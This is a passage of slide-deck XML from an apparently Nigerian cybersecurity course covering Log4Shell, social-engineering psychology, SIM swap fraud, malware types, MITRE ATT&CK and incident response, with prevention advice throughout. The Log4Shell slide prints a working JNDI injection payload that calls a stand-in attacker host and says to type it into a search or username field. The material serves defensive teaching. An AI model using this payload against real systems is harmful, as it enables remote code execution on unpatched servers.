              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Apache Log4j — a Java logging library in BILLIONS of applications</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Amazon · Apple iCloud · Microsoft · Google · Tesla · Cloudflare</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>THE EXPLOIT (just type this into a search box or username field):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>${jndi:ldap://attacker.com/exploit}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Log4j sees it → fetches the attacker's server → executes their code</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>→ Full Remote Code Execution. Zero authentication required.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>THE IMPACT:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>✗ 800,000 exploitation attempts per HOUR within 72 hours</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>✗ Nation-states, ransomware gangs, script kiddies — all using same exploit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>✗ Every unpatched Java application exposed globally</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>THE LESSON (A06):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Nobody WROTE this code — they INCLUDED it as a dependency.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>One line: log4j:log4j:2.14.1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>REMEDIATION: Upgrade to Log4j 2.17.1+</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>PREVENTION: Software Composition Analysis (SCA) scanning — scan ALL</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>your dependencies for known CVEs before deployment.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Tools: Snyk · Dependabot · OWASP Dependency-Check</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ADVANCED</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8 OPENER: SOCIAL ENGINEERING</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THE 6 PSYCHOLOGICAL LEVERS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SOCIAL ENGINEERING PSYCHOLOGY (Cialdini's 6 Principles)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>AUTHORITY            URGENCY              SOCIAL PROOF</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>"This is your CEO"   "Within 24 hours"    "Your colleague Emeka</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>"EFCC investigation" "Account suspended"   already approved this"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>"Bank fraud dept"    Disables thinking    We follow the crowd</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>RECIPROCITY          LIKING               COMMITMENT</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>"I helped you        Build rapport        "You said you'd help"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>last week"          before the ask       We follow through</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>We feel obligated    Creates trust        on commitments</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>EVERY PHISHING EMAIL, VISHING CALL, AND SMISHING TEXT</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>USES AT LEAST ONE OF THESE.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>OFTEN MULTIPLE.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Recognition = resistance.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Teach this to every employee in your future organisation.</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SIM SWAP — THE NIGERIAN EPIDEMIC</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HOW SIM SWAP FRAUD WORKS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>① PREPARATION</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Attacker buys victim data: name, address, DOB, phone number</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Sources: data brokers (₦500/record), social media, previous breaches</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>② VISIT TELCO</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Attacker visits an MTN/Airtel store with fake ID</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Claims lost SIM for victim's number</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Weak verification → new SIM issued to attacker</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>③ YOUR PHONE DIES</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Your SIM loses signal. You don't know why.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>(Often happens at night when you won't notice immediately)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>④ THE DRAIN</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Attacker receives all your SMS OTPs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Resets your banking app, mobile wallet</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Cleans out accounts by morning</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>PREVENTION:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>✓ Add SIM lock PIN with your telecom</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>✓ Use authenticator apps (Google Authenticator/Authy) not SMS OTP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>✓ Enable transfer alerts — any movement wakes you up</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>✓ If phone signal dies unexpectedly in covered area — call bank IMMEDIATELY</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ADVANCED</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9 OPENER: MALWARE ANALYSIS</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MALWARE TYPES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MALWARE CLASSIFICATION</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>[RANSOMWARE]              [BANKING TROJAN]          [RAT]</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Encrypts your files       Steals banking creds      Remote Access Trojan</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Demands payment           Web injection attacks      Full device control</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>WannaCry, LockBit         Emotet, TrickBot           NjRAT (common in NG)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Nigeria: NCC warned 2017  Nigerian banks targeted     "Bank update" on WhatsApp</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>[KEYLOGGER]               [CRYPTOJACKER]             [SPYWARE]</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Records all keystrokes    Mines crypto using          Silent monitoring</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Captures passwords        YOUR computer              Corporate espionage</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Credit card numbers        High electricity bills     Stalkerware</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>SMS OTPs                  Nigerian cafes: notable     Mobile spyware</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>MODERN REALITY:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Most attacks use MULTIPLE types combined</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>(e.g., Emotet = trojan + downloader + lateral movement + spam module)</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MITRE ATT&amp;CK FRAMEWORK</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MITRE ATT&amp;CK FRAMEWORK</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>"A knowledge base of adversary tactics and techniques</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>based on real-world observations"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>TACTICS (the WHY)            → TECHNIQUES (the HOW)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Initial Access               Phishing, Drive-by, Supply Chain</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Execution                    Macro, PowerShell, Command Line</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Persistence                  Registry keys, Scheduled Tasks, Startup</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Privilege Escalation         Exploit vulnerabilities, Token theft</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Defence Evasion              Obfuscation, Signed Binary, Rootkit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Credential Access            Keylogging, LSASS dump, Brute Force</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Lateral Movement             Pass-the-Hash, RDP, SMB</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Exfiltration                 Via encrypted channel, DNS tunnel</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Impact                       Encrypt for ransomware, Wiper, DDoS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>WHY IT MATTERS:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>→ Common language for threat intelligence sharing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>→ Maps malware behaviour to standardised technique IDs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>→ Helps defenders identify gaps in detection coverage</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>→ Used in every professional malware analysis report</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PROFESSIONAL</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10 OPENER: INCIDENT RESPONSE</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NIST INCIDENT RESPONSE LIFECYCLE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NIST INCIDENT RESPONSE LIFECYCLE</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>① PREPARATION</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>────────────────────────────────</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Incident Response Plan (IRP)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Incident Response Team (IRT)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
